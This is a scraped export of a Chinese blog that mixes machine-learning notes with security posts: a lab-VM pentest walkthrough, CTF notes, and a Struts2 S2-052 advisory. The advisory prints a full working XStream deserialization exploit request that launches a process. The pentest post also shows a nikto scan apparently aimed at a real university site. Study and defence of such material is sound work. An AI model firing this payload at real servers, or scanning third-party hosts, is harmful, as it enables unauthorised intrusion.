，可求解损失函数最小化问题，通过梯度下降确定参数 l 激活函数使用 sigmoid （或者 tanh ），则分类器事实上成为Logistic Regression，可通过梯度上升极大化似然函数，或者梯度下降极小化损失函数，来确定参数 l 如果需要多分类，则事实上成为SoftmaxRegression l 如要需要分离超平面恰好位于正例和负例的正中央，则成为支持向量机（SVM）。 多层感知器感知器存在的问题是，对线性可分数据工作良好，如果设定迭代次数上限，则也能一定程度上处理近似线性可分数据。但是对于非线性可分的数据，比如最简单的异或问题，感知器就无能为力了。这时候就需要引入多层感知器这个大杀器。 多层感知器的思路是，尽管原始数据是非线性可分的，但是可以通过某种方法将其映射到一个线性可分的高维空间中，从而使用线性分类器完成分类。图1中，从X到O这几层，正展示了多层感知器的一个典型结构，即输入层-隐层-输出层。 logistic 函数非对称： 对称： 反馈神经网络 BP神经网络Hebb改变权重上个神经元进行调整 。学习是一类相关学习，算法的基本思想是：如果有两个神经元同时兴奋，则它们之间的连接强度的增强与它们的激励的乘积成正比 在Hebb学习规则中，学习信号简单地等于神经元的输出： 用yi(k)表示单元i 在k 时刻的激活值（输出），yj (k)表示单元j在 k 时刻的激活值，wij(k)表示单元i到单元j的连接权值，则Hebb学习规则可表示如下： ∆Wij(k)=Wij(k+1)-Wij(k)=ηyi(k)yj(k+1),式中η为学习速率 权值调整量与输入输出的乘积成正比。","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://shackles.top/tags/机器学习/"}]},{"title":"机器学习重要算法","slug":"机器学习重要算法","date":"2017-10-01T15:53:56.000Z","updated":"2018-03-30T03:18:24.401Z","comments":true,"path":"2017/10/01/机器学习重要算法/","link":"","permalink":"https://shackles.top/2017/10/01/机器学习重要算法/","excerpt":"","text":"机器学习重要算法监督学习和非监督学习。 监督学习： 分类和回归； 监督学习： 聚类算法，密度估计算法。 分类 :需已知样本特征 Classification (分类)，一个 classifier 会从它得到的训练集中进行“学习”，从而具备对未知数据进行分类的能力，这种提供训练数据的过程通常叫做 supervised learning (监督学习)（样本有标签）， 所谓分类，简单来说，就是根据文本的特征或属性，划分到已有的类别中。如在自然语言处理NLP中，我们经常提到的文本分类便就是一个分类问题，一般的模式分类方法都可用于文本分类研究。 常用的分类算法包括： k-最近邻法(k-nearest neighbor，kNN)， 决策树分类法， 朴素的贝叶斯分类算法(native Bayesian classifier)(NBC)、 基于支持向量机(SVM)的分类器， 神经网络法(SNN)， 模糊分类法等等 分类作为一种监督学习方法，要求必须事先明确知道各个类别的信息，并且断言所有待分类项都有一个类别与之对应。但是很多时候上述条件得不到满足，尤其是在处理海量数据的时候，如果通过预处理使得数据满足分类算法的要求，则代价非常大，这时候可以考虑使用聚类算法。 聚类：把相似的对象聚合 Clustering(聚类)，简单地说就是把相似的东西分到一组，聚类的时候，我们并不关心某一类是什么，我们需要实现的目标只是把相似的东西聚到一起，因此，一个聚类算法通常只需要知道如何计算相似 度就可以开始工作了，因此 clustering 通常并不需要使用训练数据进行学习，这在 Machine Learning 中被称作 unsupervised learning (无监督学习). 聚类分析指将物理或抽象对象的集合分组为由类似的对象组成的多个类的分析过程。 常用的分类算法包括： 而K均值(K-meansclustering)聚类则是最典型的聚类算法 除此之外，还有很多诸如 属于划分法K-MEDOIDS算法、CLARANS算法；属于层次法的BIRCH算法、CURE算法、CHAMELEON算法等；基于密度的方法：DBSCAN算法、OPTICS算法、DENCLUE算法等；基于网格的方法：STING算法、CLIQUE算法、WAVE-CLUSTER算法；基于模型的方法，本系列后续会介绍其中几种。 参考大神博客：http://blog.csdn.net/v_july_v/article/details/7577684 分类算法kNN K-邻近算法采用测量不同特征值之间的距离方法。进行分类。目标样本与存在标签的样本集作对比。 取前K个最为相似的数据，选择K最多的目标的新分类。 给定训练数据样本和标签，对于某测试的一个样本数据，选择距离其最近的k个训练样本，这k个训练样本中所属类别最多的类即为该测试样本的预测标签。简称kNN。 通常k是不大于20的整数，这里的距离一般是欧式距离。 一般流程 收集数据（距离计算所需要的数值，最好是结构化的数据格式） 分析数据：可以使用任何方法 训练算法：此步骤不适合K-邻近算法 测试算法：计算错误率 使用算法：输入样本数据+结构化输出结果 —》然后运行k-近邻算法判定输入数据属于哪个分类-=-》最后应用对计算出的分类执行后续操作。 决策树决策树学习采用的是自顶向下的递归方法，其基本思想是以信息熵为度量构造一棵熵值下降最快的树，到叶子节点处的熵值为零，此时每个叶节点中的实例都属于同一类。以树的形式划分数据集(ID3算法)。 一般流程 收集数据(树构造算法只适用于标称型数据、数据必须离散化) 分析数据：检查图形是否符合规范 训练算法:构造树的数据结构(ID3算法等等) 测试算法：使用经验树计算错误率 使用算法:此步骤可以适用于任何监督学习算法，而使用决策树可以更好的理解数据的内在含义。 朴素贝叶斯在给定目标值时属性之间相互条件独立的前提下，贝叶斯决策理论的核心思想：即选择具有最高概率的决策。 （基于条件概率） 一般流程 收集数据（需要数值型或者布尔型） 分析数据 训练算法：计算不同的独立特征的条件概率 测试算法：计算错误率 使用算法：文档分类居多 回归（预测）Logistic 回归最优化算法。 logistic函数根据现有的数据对于分类边界线建立回归公式。参考：https://www.zhihu.com/question/36714044?sort=created 一般流程 收集数据（需要进行距离计算，数值型，结构化数据最佳） 训练数据：大部分时间进行训练，训练的目的是为了找到最佳的分类回归系数。 测试数据 使用数据：输入数据–》结构化处理–》分类判定–》基于已经训练好的回归系数就可以对于这些数值进行简单的回归计算，判定它们属于哪个分类–》进一步处理 ​ support vector machine (SVM)支持向量机，因其英文名为support vector machine，故一般简称SVM，通俗来讲，它是一种二类分类模型，其基本模型定义为特征空间上的间隔最大的线性分类器，其学习策略便是间隔最大化，最终可转化为一个凸二次规划问题的求解。 参考：http://blog.csdn.net/v_july_v/article/details/7624837 https://www.zhihu.com/question/21094489https://zhuanlan.zhihu.com/p/21932911?refer=baina SVM通过核函数视图非线性的问题的数据集转变为核空间中一个线性可分的数据集。 神经网络是通过多个感知器(Perceptron)的组合叠加来解决非线性的分类问题。 神经网络CNN(卷积神经网络)CNN：https://www.zhihu.com/question/52668301 一般流程聚类算法# 隐马可夫模型(HMM)马可夫模型参考：https://www.zhihu.com/question/20962240 马尔可夫模型可以看做是一个转移弧上有概率的非确定的有限状态自动机。image 在上图中，圆圈表示状态，状态之间的转移用带箭头的弧表示，弧上的数字为状态转移的概率，初始状态用标记为start的输入箭头表示，假设任何状态都可作为终止状态。图中零概率的转移弧省略，且每个节点上所有发出弧的概率之和等于1。 隐马可夫模型(HMM)每个状态代表了一个可观察的事件，所以，马可夫模型有时又称作视马可夫模型(VMM)，这在某种程度上限制了模型的适应性。而在我们的隐马可夫模型(HMM)中，我们不知道模型所经过的状态序列，只知道状态的概率函数，也就是说，观察到的事件是状态的随机函数，因此改模型是一个双重的随机过程。其中，模型的状态转换是不可观察的，即隐蔽的，可观察事件的随机过程是隐蔽的状态过程的随机函数。 k-均值算法过程：Kmeans中文称为k-均值，步骤为： (1)它事先选定k个聚类中心，(2)然后看每个样本点距离那个聚类中心最近，则该样本就属于该聚类中心。(3)求每个聚类中心的样本的均值来替换该聚类中心(更新聚类中心)。(4)不断迭代(2)和(3), 直到收敛。","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://shackles.top/tags/机器学习/"}]},{"title":"靶机渗透一","slug":"沙盒靶机渗透一","date":"2017-09-19T15:53:56.000Z","updated":"2018-03-30T00:40:27.501Z","comments":true,"path":"2017/09/19/沙盒靶机渗透一/","link":"","permalink":"https://shackles.top/2017/09/19/沙盒靶机渗透一/","excerpt":"","text":"1ip：192.168.1.106 //靶机ip nmap -sS -A 192.168.1.10612345678910111213141516171819root@shackle:~# nmap -sS -A 192.168.1.106Nmap scan report for 192.168.1.106Host is up (0.31s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 89:c2:ae:12:d6:c5:19:4e:68:4a:28:e9:06:bd:9c:19 (RSA)|_ 256 f0:0c:ae:37:10:d3:6d:a2:85:3a:77:04:06:94:f8:0a (ECDSA)80/tcp open http nginx|_http-server-header: nginx|_http-title: Welcome!514/tcp filtered shell3260/tcp open iscsi?|_iscsi-info: ERROR: Script execution failed (use -d to debug)Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (96%), BlueArc Titan 2100 NAS device (91%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 22 80 port,326 port 是iscsi的端口。参考：http://www.freebuf.com/articles/102500.htmlhttp://www.freebuf.com/articles/102500.htmlhttps://www.pentestpartners.com/security-blog/an-interesting-route-to-domain-admin-iscsi/ iSCSI：Internet 小型计算机系统接口 （iSCSI：Internet Small Computer System Interface）。 1234iSCSI主要是透过TCP/IP的技术，将储存设备端透过iSCSI target (iSCSI目标端)功能，做成可以提供磁盘的服务器端，再透过iSCSI initiator (iSCSI初始化用户)功能，做成能够挂载使用iSCSI target的用户端，如此便能透过iSCSI设置来进行磁盘的应用了。也就是说，iSCSI 这个架构主要将储存装置与使用的主机分为两个部分，分别是： iSCSI target：就是储存设备端，存放磁盘或RAID的设备，目前也能够将Linux主机模拟成iSCSI target了！ 目的在提供其他主机使用的『磁盘』；iSCSI initiator：就是能够使用target的用户端，通常是服务器。 也就是说，想要连接到iSCSI target的服务器，也必须要安装iSCSI initiator的相关功能后才能够使用iSCSI target提供的磁盘。 dirb http://192.168.1.106 #扫目录1http://192.168.1.106/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/dba/program/font/index.html #### 123456789&gt;&gt;&gt; import base6&gt;&gt;&gt; a = &apos;SGVsbG8sIGlzIGl0IGZsYWdzIHlvdSdyZSBsb29raW5nIGZvcj8KSSBjYW4gc2VlIGl0IGluIHlvdXIgZXllcwpJIGNhbiBzZWUgaXQgaW4geW91ciBzbWlsZQpGbGFncyBhcmUgYWxsIEkndmUgZXZlciB3YW50ZWQgYW5kIG15IHBvcnRzIGFyZSBvcGVuIHdpZGUgCkNhdXNlIHlvdSBrbm93IGp1c3Qgd2hhdCB0byBzYXkgYW5kIHlvdSBrbm93IGp1c3Qgd2hhdCB0byBkbwpBbmQgSSB3YW50IHRvIHRlbGwgeW91IHNvIG11Y2gsIG5vIGZsYWdzIGZvciB5b3UuLi4K&apos;&gt;&gt;&gt; print base64.b64decode(a)Hello, is it flags you&apos;re looking for?I can see it in your eyesI can see it in your smileFlags are all I&apos;ve ever wanted and my ports are open wide Cause you know just what to say and you know just what to doAnd I want to tell you so much, no flags for you... 12345678910111213141516root@shackle:~# nikto -h 192.168.1.106- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.1.106+ Target Hostname: 192.168.1.106+ Target Port: 80+ Start Time: 2017-09-19 22:27:41 (GMT8)---------------------------------------------------------------------------+ Server: nginx+ Server leaks inodes via ETags, header found with file /, fields: 0x58b7fa74 0x511 + The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)+ 7535 requests: 0 error(s) and 4 item(s) reported on remote host+ End Time: 2017-09-19 22:27:59 (GMT8) (18 seconds) 12345678root@shackle:~# iscsiadm -m discovery -t st -p 192.168.1.106:3260 #连接192.168.1.106:3260,1 iqn.2017-02.local.skuzzy:storage.sys0root@shackle:~# iscsiadm --m node -p 192.168.1.106 --login --target #登录iqn.2017-02.local.skuzzy:storage.sys0Logging in to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.1.106,3260] (multiple)Login to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.1.106,3260] successful. 12345678910111213141516171819202122232425root@shackle:~# fdisk -lDisk /dev/sda: 60 GiB, 64424509440 bytes, 125829120 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0x5acbe586Device Boot Start End Sectors Size Id Type/dev/sda1 * 2048 124780543 124778496 59.5G 83 Linux/dev/sda2 124782590 125827071 1044482 510M 5 Extended/dev/sda5 124782592 125827071 1044480 510M 82 Linux swap / SolarisDisk /dev/sdb: 1 GiB, 1073741824 bytes, 2097152 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesroot@shackle:~# mount /dev/sdb /mnt/ # 挂载root@shackle:~# cd /mnt/root@shackle:/mnt# cat flag1.txtCongratulations! You&apos;ve discovered the first flag!flag1&#123;c0abc15976b98a478150c900ebb0c86f0327f4dd&#125;Let&apos;s see how you go with the next one... - Nikto v2.1.6 Target IP: 210.44.112.115 Target Hostname: cs.lcu.edu.cn Target Port: 80 Start Time: 2017-09-19 23:44:55 (GMT8) Server: Apache Retrieved x-powered-by header: PHP/5.4.29 The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS Uncommon header ‘link’ found, with contents: http://cs.lcu.edu.cn/; rel=shortlink The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type Entry ‘/wp-admin/‘ in robots.txt returned a non-forbidden or redirect HTTP code (302) “robots.txt” contains 2 entries which should be manually viewed. Uncommon header ‘tcn’ found, with contents: list Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for ‘index’ were found: index.php Web Server returns a valid response with junk HTTP methods, this may cause false positives. Server leaks inodes via ETags, header found with file /sitemap.xml, fields: 0x0 0x4fc7e6798f940 OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. OSVDB-3092: /news: This might be interesting… /test/test.php: Output from the phpinfo() function was found. OSVDB-3233: /test/test.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. OSVDB-3092: /LICENSE.txt: License file found may identify site software. OSVDB-3092: /xmlrpc.php: xmlrpc.php was found. OSVDB-3092: /ci/: This might be interesting… potential country code (CÔte D’ivoire) /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin ‘Tested up to’ version usually matches the WordPress version /readme.html: This WordPress file reveals the installed version. /wp-links-opml.php: This WordPress script reveals the installed version. OSVDB-3092: /license.txt: License file found may identify site software. OSVDB-3092: /LICENSE.TXT: License file found may identify site software. Cookie wordpress_test_cookie created without the httponly flag /wp-login/: Admin login page/section found. /wordpress/: A Wordpress installation was found. 8369 requests: 0 error(s) and 28 item(s) reported on remote host End Time: 2017-09-20 00:59:39 (GMT8) (4484 seconds)","categories":[{"name":"blog","slug":"blog","permalink":"https://shackles.top/categories/blog/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://shackles.top/tags/渗透/"}]},{"title":"状态估计背景历史","slug":"姿势估计背景历史","date":"2017-09-15T15:53:56.000Z","updated":"2018-04-01T01:36:25.832Z","comments":true,"path":"2017/09/15/姿势估计背景历史/","link":"","permalink":"https://shackles.top/2017/09/15/姿势估计背景历史/","excerpt":"","text":"2015 年之前的方法都是回归出精确的关节点坐标( x,y )，采用这种方法不好的原因是人体运动灵活，模型可扩展性较差。 多人姿态估计的两种研究方法： 自顶向下(top-down)：先检测出多个人,再对每一个人进行姿态估计，可以将detection的方法加上单人姿态估计来实现； 自底向上(bottom-up)：先检测出关节点,再判断每一个关节点属于哪一个人。 基于cnn的多人姿态估计方法 多人估计方法一般分为两大类，即自顶向下和自底向上， 其中自顶向下是指先把人框出来，然后再用单人的方法去定位人的关节， 而自底向上的方法是先把所有关节位置弄出来，然后再区分关节属于谁。 二维图像姿态估计基于cnn的单人姿态估计方法 2014 deeppose 直接回归关节的坐标 ： 深度姿势直接回归关节的坐标 2015 flowconvnet 回归heatmap，间接得到坐标 ：使用卷积神经网络回归热图，间接得到坐标。 2016 很多方法了 CPM，hourglass， 以及一票改结构的方法 2017 依旧改结构，感觉很无趣，xiaogang组的wei wang和xiaochu基于hourglass改的一个网络目前是第一，91.5% 2016 mpii的deep cut和deeper cut 2017 partaffine field方法，cmu的，效果很赞。openpose。 一、 多人 ： 2D Pose estimation： \\1. open-Pose：（CVPR 2017 Oral, CMU） 性能：COCO: 61%MPII:75% 自下而上的方法 \\2. G-RMI (CVPR 2017 Google) 性能：COCO: 67% 3.Associative Embedding &lt;AssociativeEmbedding:End-to-End Learning for Joint Detection and Grouping&gt;(rejected by ICCV2017 , UMICH Jia Deng) 性能： COCO:66% MPII: 77% \\4. ( ICCV 2017, UCLA) 自下而上的方法 性能：PASCAL-Person-Part:62.8% \\5. (ICCV 2017, Facebook，Kaiming He） RCNN 性能：COCO: 63% \\6. &lt;RMPE: Regional Multi-Person Pose Estimation&gt;(ICCV 2017 , SJTU ,Tencent Youtu) 性能：COCO :61.8% MPII: 76% \\1. open-Pose：&lt;使用部分亲和场的实时多人2D姿态估计&gt;（CVPR 2017 Oral，CMU） 性能：COCO：61％MPII：75％ \\2. G-RMI&lt;朝向准确的多人姿势估计&gt;（CVPR 2017 Google） 性能：COCO：67％ 3.关联嵌入&lt;关联嵌入：联合检测和分组的端到端学习&gt;（由ICCV2017，UMICHJia Deng拒绝） 性能：COCO：66％MPII：77％ \\4. &lt;联合多人姿态估计和语义部分分割&gt;（ICCV 2017，UCLA） 性能：PASCAL-Person-Part：62.8％ \\5. （ICCV 2017，Facebook，开明和）RCNN 性能：COCO：63％ \\6. &lt;RMPE：区域多人姿态估计&gt;（ICCV 2017，上海交通大学，腾讯优图） 性能：COCO：61.8％MPII：76％ 二、3D Poseand Shape estimation \\7. SMPLify:3D Human Pose and Shape from a Single Image (ECCV 2016) \\8. A simplebaseline for 3d human pose estimation in tensorflow. To be presented at ICCV17. \\9. Coarse-to-Fine Volumetric Prediction forSingle-Image 3D Human Pose (CVPR),2017 其中： 1. Bottom-up approach 自下而上的方法： 先检测joints（关节）和 limbs（四肢），然后将他们group （组）成一个人。 代表文章 。 优点：整个图像只需要处理一遍，速度不随人数增加而变化； 2. Top-Down approach 自上而下的方法： 先检测单个人，再针对单个人做single-person poseestimation。 代表文章 先检测单个人，逐步对于每个进行 检测 优点：思路直观，自然，被绝大部分人所青睐，且单人估计精度非常高。 相关数据集/ 竞赛 MSCOCOKeypoint http://cocodataset.org/ MPII http://human-pose.mpi-inf.mpg.de/#results Posetrack https://posetrack.net/","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://shackles.top/tags/机器学习/"}]},{"title":"车联网安全","slug":"车联网安全基础","date":"2017-09-09T15:53:56.000Z","updated":"2018-04-01T00:45:30.233Z","comments":true,"path":"2017/09/09/车联网安全基础/","link":"","permalink":"https://shackles.top/2017/09/09/车联网安全基础/","excerpt":"","text":"车联网安全基础 2017-08-02 车联网汽车现状：智能化 ，网联化，电动化 车载系统 ​ 安全现状 ： 车联网安全解决方案 终端 设计 ids 网络 车内部可信机制 车与智能手机 车网络服务 云服务 标准规范 车载网络 CSMA/CD 带冲突检测控制 CAN总线 主要测传输机制csma/cd CAN是控制器局域网络(Controller Area Network, CAN)的简称 一种通讯协议（类似TCP IP协议） ​ 车载网络 C类网络 录制重放 隔离重放 实时 man-in-the-middle ### 手机卡 HMI 与车内 网络软件操作系统的安全性、通讯安全、对于安全持续度量。 防御自动驾驶安全性问题 方程式 Al 内部攻击 传感信号伪造​ 自动驾驶以及车联网的整体安全架构 系统安全的设计 车通讯 车就是个内网重放 篡改 网络与系统防御与攻击 app加固 车联网安全 T-BOX（网络） CAN总线（控制汽车）","categories":[],"tags":[{"name":"物联网安全","slug":"物联网安全","permalink":"https://shackles.top/tags/物联网安全/"}]},{"title":"Struts2 远程代码执行漏洞S2-052","slug":"Struts2 远程代码执行漏洞S2-052","date":"2017-09-06T15:53:56.000Z","updated":"2018-03-29T23:22:30.424Z","comments":true,"path":"2017/09/06/Struts2 远程代码执行漏洞S2-052/","link":"","permalink":"https://shackles.top/2017/09/06/Struts2 远程代码执行漏洞S2-052/","excerpt":"","text":"Struts2 远程代码执行漏洞S2-052 2017-09-06 Struts2 远程代码执行漏洞 : S2-052Struts2 应用又曝出存在新的高危远程代码执行漏洞。该漏洞由lgtm.com的安全研究员汇报，编号为 CVE-2017-9805 ，漏洞危害程度为高危（Critical）。当用户使用带有 XStream 程序的 Struts REST 插件来处理 XML payloads 时，可能会遭到远程代码执行攻击。 前提：启用Strut REST 插件。 Struts 2.5 – Struts 2.5.12 版本 官方公告：https://cwiki.apache.org/confluence/display/WW/S2-052 漏洞编号：S2-052 CVE-2017-9805 S2-052概述Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。任意攻击者都可以构造恶意的XML内容提升权限。 漏洞是由 Semmle 使用其开源分析工具 lgtm 及 QL 语言编写的 Java 反序列威胁查询检测而出的，详情可参考https://lgtm.com/blog/apache_struts_CVE-2017-9805 12345org.apache.struts2.rest.handler.AllowedClassesorg.apache.struts2.rest.handler.AllowedClassNamesorg.apache.struts2.rest.handler.XStreamPermissionProvider 漏洞POC123456789101112131415161718GET /struts2-rest-showcase/orders.xhtml HTTP/1.1Host: localhost:8080User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/xmlReferer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/editCookie: JSESSIONID=6FBA41434A908795E708AE545267C797; UM_distinctid=15e36471d10d0-09d67d334fbd0f8-49594234-100200-15e36471d11231; CNZZDATA1670348=cnzz_eid%3D1690420666-1504145890-%26ntime%3D1504329636Connection: closeIf-None-Match: 182927695Content-Length: 1647&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;C:\\Windows\\System32\\calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;/map&gt; 效果如下：","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://shackles.top/tags/漏洞/"}]},{"title":"CTF-逆向 基础","slug":"CTF-逆向 基础","date":"2017-08-29T15:53:56.000Z","updated":"2018-03-29T23:24:36.263Z","comments":true,"path":"2017/08/29/CTF-逆向 基础/","link":"","permalink":"https://shackles.top/2017/08/29/CTF-逆向 基础/","excerpt":"","text":"CTF-逆向 基础 2017-08-07 https://www.gitbook.com/book/wizardforcel/re-for-beginners/details 逆向 ida 调试 安卓 native层 设置断点 设置程序 安卓附加上去，IDA F5调试 去除软件保护 侦壳 PEID Exelnfo （查看是什么壳） 脱壳 脱壳机 esp 定快速脱壳 去除花指令 OLLyDBG脚本 去除混淆 net 反混淆de4dot 定位验证代码 验证代码（算法） 正面驱动直入 从输入输出寻找 利用字符串找 CTF逆向常见算法 简单算法 简单异或 带雪崩的异或 加密算法（AES , RSA) 散列算法（MD5，SHA1) 解方程 有趣的算法 走迷宫 ..各种脑洞 经验加成 边信道攻击 Google 大法好 逆向trick xspy 应对MFC程序 手动加载signature 调试小技巧 CTF VS 现实 IDA高级使用 ​","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://shackles.top/tags/CTF/"}]},{"title":"CTF-Misc","slug":"ctf-misc","date":"2017-08-19T15:53:56.000Z","updated":"2018-03-29T23:24:11.692Z","comments":true,"path":"2017/08/19/ctf-misc/","link":"","permalink":"https://shackles.top/2017/08/19/ctf-misc/","excerpt":"","text":"CTF-Misc 2017-08-06 misc先上一些常用命令strings // 查找字符 foremost // 自动分离 binwalk // binwalk -e 自动提取 diff // 对比文件 pacpfix // pcap文件修复工具 DShell tshark // 命令行提取数据包 或者tcpdump Recon(信息收集)很少出现 Encode编码 各种进制 ​ 二进制转化为 123ASCII二维码图片 base家族 base64 32 16 曼彻斯特编码/差分曼彻斯特编码 二进制编码工具：JpocketKnife1.得到的二进制有可能7位一组，正常八位一组2.二维码：二进制串的长度是一个平方数3.因式分解其长度 base64编码方式： 字符对应ASCII转换成八位二进制 base64的基础单位是 38bit的二进制，若是不够38bit则在后面添加0字节（padding）直至满足 38bit的二进制转换成46bit的二进制 4*6bit的二进制转换成十进制 对照base64表把十进制转换成字符 解码方式: 检查base64编码后面有几个等于号 把字符串按照base64表转换成4*6的倍数位数二进制 删除等于号的个数*8的bit 按照6个bit一组转成字符 可以发现，编码和解码的方式并非完全对称的，解码的时候直接根据等号的数量删除bit,如果我们把数据写到填充的0的前两位，那么就可以实现隐写的功能。 判断方法: 先解码在编码，和原字符串对比，若不一样就是有隐写 www.atool.org(编码工具集) www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html(介绍CTF编码的文章) 图形码条形码,二维码。 Quoted printable用等号隔开 Brainfuckhttps://www.splitbrain.org/services/ook JSfuckhttp://www.jsfuck.com/可以直接扔到浏览器里运行 ####代码混淆明显，在线解码 工具小结http://tool.ph0en1x.com/hashtool/tools.html#convJPKCTFCrack Forensic &amp; Stego 取证对象：各种数据包PCAP,图像，音频，压缩包，磁盘，内存镜像，PDF,word 目的：发现文件隐藏的字符串，通常有文件的修复,字符串常常又与隐写加密结合在一起 &lt;&lt;黑客大追踪&gt;&gt; 熟悉常用文件的文件头。 Tools file strings diff binwalk,foremost binwalk -e拓展提高：http://www.freebuf.com/sectool/15266.html 010ditor分析文件16进制,强大的模板功能 图片：JPG特征：以 FF D8 开头，以 FF D9 结尾。格式：标记码+压缩数据标记码： 由两个字节构成，第一个字节是固定值0xFF，后一个字节则根据不同意义有不同数值压缩数据：前两个字节保存整个段的长度，包括这两个字节隐写方式：利用文件格式隐藏信息，插入法 文件尾部插入储存在APP1数据区中工具：MagicEXIF 每段开始前COM注释：FF 开始标记FE COM注释标记符00 02 总长度 11 内容工具:stegdetect 检测隐写工具 PNG特征：以89 50 4E 47 开头。格式:PNG文件署名域+标准数据块(+辅助数据块)隐写方式: IDAT 隐藏数据:PNG图片中可以存在多个IDAT块 因此这也成了一个隐写的途径 修改PNG图片的高度,隐藏数据 双图 ​ 工具:pngcheck ​ #####pngcheck LSB隐写stegsolve:必备 ​ 位平面对图像的影响不一样，可以隐写到不是很重要的位平面。 BMP 文件格式特征是以 50 4B 03 04 开头，有时也会出现 50 4B 05 06 